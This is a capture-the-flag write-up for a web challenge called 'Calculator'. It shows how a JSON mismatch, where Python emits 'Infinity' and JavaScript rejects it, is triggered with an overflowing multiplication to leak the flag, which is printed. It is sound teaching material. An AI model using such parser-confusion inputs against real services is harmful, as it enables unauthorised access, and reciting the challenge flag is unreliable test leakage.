# Calculator

## Table of Contents

1. [Overview](#overview)
2. [Background](#background)
3. [Enumeration](#enumeration)
4. [Exploitation](#exploitation)
5. [Conclusion](#conclusion)

## Overview

- Solved by: @siunam
- 46 solves / 100 points
- Difficulty: Easy
- Author: Sean
- Overall difficulty for me (From 1-10 stars): ★★☆☆☆☆☆☆☆☆

## Background

I made a calculator! I'm using Python to do the math since I heard it's strongly typed, so my calculator should be pretty safe. Download the source code by clicking the download button above!

![](https://github.com/siunam321/CTF-Writeups/blob/main/San-Diego-CTF-2024/images/Pasted%20image%2020240513170055.png)

## Enumeration

**Index page:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/San-Diego-CTF-2024/images/Pasted%20image%2020240513170213.png)

In here, we can submit math expressions, then the web application will evaluate the expression and response the result back to us:

![](https://github.com/siunam321/CTF-Writeups/blob/main/San-Diego-CTF-2024/images/Pasted%20image%2020240513170420.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/San-Diego-CTF-2024/images/Pasted%20image%2020240513170432.png)

**Burp Suite HTTP history:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/San-Diego-CTF-2024/images/Pasted%20image%2020240513170447.png)

When we submit the form, it'll send a POST request to `/` with parameter `expression`.

Hmm... There's not much we can do here, let's read this web application's source code!

**In this challenge, we can download a [file](https://github.com/siunam321/CTF-Writeups/blob/main/San-Diego-CTF-2024/Web/calculator/calculator.zip):**
```shell
┌[siunam♥Mercury]-(~/ctf/San-Diego-CTF-2024/Web/calculator)-[2024.05.13|17:02:43(HKT)]
└> file calculator.zip 
calculator.zip: Zip archive data, at least v2.0 to extract, compression method=deflate
┌[siunam♥Mercury]-(~/ctf/San-Diego-CTF-2024/Web/calculator)-[2024.05.13|17:02:44(HKT)]
└> unzip calculator.zip       
Archive:  calculator.zip
  inflating: calculate.py            
  inflating: Dockerfile              
  inflating: expression_parser.ts    
  inflating: index.ts                
  inflating: result.html             
   creating: static/
  inflating: static/index.css        
  inflating: static/index.html       
```

After reviewing the source code, we have the following findings:

In the `Dockerfile`, the web application is running the **[Deno](https://deno.com/)**:

```bash
[...]
# You might be wondering what the point of using Deno is if I'm just going to
# remove all the security features.
CMD deno run -A index.ts
```

> Deno is the open-source JavaScript runtime for the modern web. Built on web standards with zero-config TypeScript, unmatched security, and a complete built-in toolchain, Deno is the easiest, most productive way to JavaScript. - [https://deno.com/](https://deno.com/)

**As you can see, the `-A` option means run the script with all permissions:**
```shell
┌[siunam♥Mercury]-(~/ctf/San-Diego-CTF-2024/Web/calculator)-[2024.05.13|17:08:44(HKT)]
└> deno run -h
[...]
  -A, --allow-all
          Allow all permissions. Learn more about permissions in Deno:
          https://deno.land/manual@v1.43.3/basics/permissions
[...]
```

**`expression_parser.ts`:**
```typescript
[...]
export type Expression =
  | { op: '+' | '-' | '*' | '/'; a: Expression; b: Expression }
  | { value: number }
[...]
export function parse (expression: string): Expression | null {
  for (const result of parseAddExpr(expression.replace(/\s/g, ''))) {
    if (result.string === '') {
      return result.expr
    }
  }
  return null
}
[...]
```

In here, function `parse()` **only accepts operator `+`, `-`, `*`, `/`, and number value**.

It's also worth noting that function `parseFloat()` only process if the floating number **is finite**, which means the floating number is not **infinity**:

```typescript
[...]
function * parseFloat (string: string): ParseResult {
  for (const regex of [
    /[-+](?:\d+\.?|\d*\.\d+)(?:e[-+]?\d+)?$/,
    /(?:\d+\.?|\d*\.\d+)(?:e[-+]?\d+)?$/
  ]) {
    const match = string.match(regex)
    if (!match) {
      continue
    }
    const number = +match[0]
    if (Number.isFinite(number)) {
      yield {
        expr: { value: number },
        string: string.slice(0, -match[0].length)
      }
    }
  }
}
function * parseLitExpr (string: string): ParseResult {
  yield * parseFloat(string)
  if (string[string.length - 1] === ')') {
    for (const result of parseAddExpr(string.slice(0, -1))) {
      if (result.string[result.string.length - 1] === '(') {
        yield { ...result, string: result.string.slice(0, -1) }
      }
    }
  }
}
[...]
```

**`index.ts`:**
```typescript
[...]
import { parse } from './expression_parser.ts'
[...]
Deno.serve({ port: 8080 }, async (req: Request) => {
    [...]
    if (pathname === '/' && req.method === 'POST') {
      const body = await req.formData()
      const expression = body.get('expression')
      [...]
      const parsed = parse(expression)
      [...]
      let success = false
      let output = ''

      const result = await new Deno.Command('python3.11', {
        args: ['calculate.py', JSON.stringify(parsed)]
      }).output()
      const error = decoder.decode(result.stderr).trim()
      const json = decoder.decode(result.stdout).trim()
      if (error.length > 0) {
        output = error
      } else if (json.startsWith('{') && json.endsWith('}')) {
        try {
          output = JSON.parse(json).result
          success = true
        } catch (error) {
          output = `wtf!!1! this shouldnt ever happen\n\n${
            error.stack
          }\n\nheres the flag as compensation: ${
            Deno.env.get('GZCTF_FLAG') ?? 'sdctf{...}'
          }`
        }
      } else {
        output = 'python borked'
      }
      [...]
```

In here, we can see that the flag will be respond to us with a very specific condition. Let's take a closer look.

First, our expression get parsed via the `parse()` function from `expression_parser.ts`.

**For example, if our expression is `7*7`, the parsed expression will be this object:**
```typescript
{ op: "*", a: { value: 7 }, b: { value: 7 } }
```

**or in JSON:**
```json
{"op":"*","a":{"value":7},"b":{"value":7}}
```

**After that, it'll parse the parsed JSON expression to `calculate.py` and run it with `python3.11`:**
```typescript
const result = await new Deno.Command('python3.11', {
        args: ['calculate.py', JSON.stringify(parsed)]
      }).output()
```

**`calculate.py`:**
```python
[...]
def evaluate(expression):
    if "value" in expression:
        return expression["value"]
    match expression["op"]:
        case "+":
            return evaluate(expression["a"]) + evaluate(expression["b"])
        case "-":
            return evaluate(expression["a"]) - evaluate(expression["b"])
        case "*":
            return evaluate(expression["a"]) * evaluate(expression["b"])
        case "/":
            return evaluate(expression["a"]) / evaluate(expression["b"])

print(json.dumps({"result": evaluate(json.loads(sys.argv[1]))}))
```

**In here, it evaluates (calculates) the parsed JSON expression, and then parse the result into a JSON object:**
```shell
┌[siunam♥Mercury]-(~/ctf/San-Diego-CTF-2024/Web/calculator)-[2024.05.13|17:29:33(HKT)]
└> python3.11 calculate.py '{"op":"*","a":{"value":7},"b":{"value":7}}'
{"result": 49}
```

**Finally, if the final JSON result has no error, it'll parse the evaluated JSON result to a JavaScript object:**
```typescript
const error = decoder.decode(result.stderr).trim()
const json = decoder.decode(result.stdout).trim()
if (error.length > 0) {
  output = error
} else if (json.startsWith('{') && json.endsWith('}')) {
  try {
    output = JSON.parse(json).result
    success = true
  } catch (error) {
    output = `wtf!!1! this shouldnt ever happen\n\n${
      error.stack
    }\n\nheres the flag as compensation: ${
      Deno.env.get('GZCTF_FLAG') ?? 'sdctf{...}'
    }`
  }
} else {
  output = 'python borked'
}
```

If the application somehow **unable to parse the evaluated JSON result** to a JavaScript object, it'll give us the flag.

**Expression parsing TLDR:**
1. `parse(expression)` (Output: JavaScript object)
2. `python3.11 calculate.py JSON.stringify(parsed)` (Input: ***JavaScript*** **JSON string**, output: ***Python*** **JSON string**)
3. `JSON.parse(json).result` (Input: ***Python*** **JSON string**, Output: JavaScript object)

Hmm... So, we'll need to make the web application to **cause an error when during parsing the final result JSON string back to JavaScript object**.

Uh... How?

When me and my teammates trying to solve a web challenge from LA CTF 2024 ([Writeup here](https://siunam321.github.io/ctf/LA-CTF-2024/web/jason-web-token/)), we noticed that **Python has `inf` (Infinity) floating number**:

```shell
┌[siunam♥Mercury]-(~/ctf/San-Diego-CTF-2024/Web/calculator)-[2024.05.13|17:34:33(HKT)]
└> python3.11
[...]
>>> float('inf')
inf
>>> type(float('inf'))
<class 'float'>
```

And so does the **JavaScript**'s `Infinity` floating number:

```shell
┌[siunam♥Mercury]-(~/ctf/San-Diego-CTF-2024/Web/calculator)-[2024.05.13|17:51:25(HKT)]
└> nodejs 
[...]
> Infinity
Infinity
> typeof Infinity
'number'
```

Hmm... I wonder **whether if JSON accept `Infinity` floating number or not**:

**In Python, it's a yes:**
```shell
┌[siunam♥Mercury]-(~/ctf/San-Diego-CTF-2024/Web/calculator)-[2024.05.13|17:55:46(HKT)]
└> python3.11
[...]
>>> import json
>>> json.dumps(float('inf'))
'Infinity'
>>> json.loads('Infinity')
inf
```

**But in JavaScript, it's a big no no:**
```shell
┌[siunam♥Mercury]-(~/ctf/San-Diego-CTF-2024/Web/calculator)-[2024.05.13|17:56:50(HKT)]
└> nodejs   
[...]
> JSON.stringify(Infinity)
'null'
> JSON.parse(Infinity)
Uncaught SyntaxError: Unexpected token I in JSON at position 0
```

According to **[RFC 4627 (JSON standard)](https://datatracker.ietf.org/doc/html/rfc4627#section-2.4)**, it said this in section "2.4. Numbers":

> Numeric values that cannot be represented as sequences of digits (such as ***Infinity*** and NaN) are ***not permitted***.

So... For some weird reason? **Python's JSON library does NOT comply with RFC 4627's infinity floating number**.

Ah ha!!! We can **abuse that to cause JSON parsing error on the JavaScript side, but not on the Python side**!

## Exploitation

Armed with above information, we can craft an expression that will evaluate the result as an infinity floating number!

To do so, we can use this:

```
1e+1000
```

Which resulted in!

**Modified `expression_parser.ts`:**
```typescript
console.log(parse('1e+1000'))
```

```shell
┌[siunam♥Mercury]-(~/ctf/San-Diego-CTF-2024/Web/calculator)-[2024.05.13|18:07:05(HKT)]
└> deno run -A ./expression_parser.ts
null
```

Oh... Yeah, **don't forget the `Number.isFinite(number)` check**:

```typescript
function * parseFloat (string: string): ParseResult {
  for (const regex of [
    /[-+](?:\d+\.?|\d*\.\d+)(?:e[-+]?\d+)?$/,
    /(?:\d+\.?|\d*\.\d+)(?:e[-+]?\d+)?$/
  ]) {
    const match = string.match(regex)
    if (!match) {
      continue
    }
    const number = +match[0]
    if (Number.isFinite(number)) {
      yield {
        expr: { value: number },
        string: string.slice(0, -match[0].length)
      }
    }
  }
}
```

To work around with this, we can let Python evaluate our expression to `inf`.

**Hence, our final expression is this:**
```
1.7976931348623157e+308*69
```

> Note: JavaScript maximum floating number is `1.7976931348623157e+308`:
> 
> ```shell
> ┌[siunam♥Mercury]-(~/ctf/San-Diego-CTF-2024/Web/calculator)-[2024.05.13|18:08:12(HKT)]
> └> nodejs
> [...]
> > Number.MAX_VALUE
> 1.7976931348623157e+308
> ```

![](https://github.com/siunam321/CTF-Writeups/blob/main/San-Diego-CTF-2024/images/Pasted%20image%2020240513181501.png)

Nice! We caused JSON parsing error in the final result!

- **Flag: `sdctf{7Her3_wAS_OnCE_a_cpp_STAcKoV3r1IoW_9Uy_Wh0_WAs_suP3R_P3D4N7lc_A6ouT_f1o4tS}`**

## Conclusion

What we've learned:

1. JSON parsing confusion